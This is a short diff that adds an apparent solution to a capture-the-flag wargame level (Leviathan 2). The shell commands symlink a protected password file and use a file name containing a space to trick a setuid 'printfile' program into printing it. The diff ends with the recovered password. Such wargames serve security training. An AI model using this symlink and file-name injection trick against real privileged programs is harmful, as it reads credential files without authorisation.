@@ -1,0 +1,8 @@
+mktemp -d
+cd /tmp/tmp.ZaDxGmgfGm
+ln -s /etc/leviathan_pass/leviathan3 link
+touch "link topass"
+chmod 777 /tmp/tmp.ZaDxGmgfGm
+cd ~
+./printfile  /tmp/tmp.ZaDxGmgfGm/"link topass"
+f0n8h2iWLP
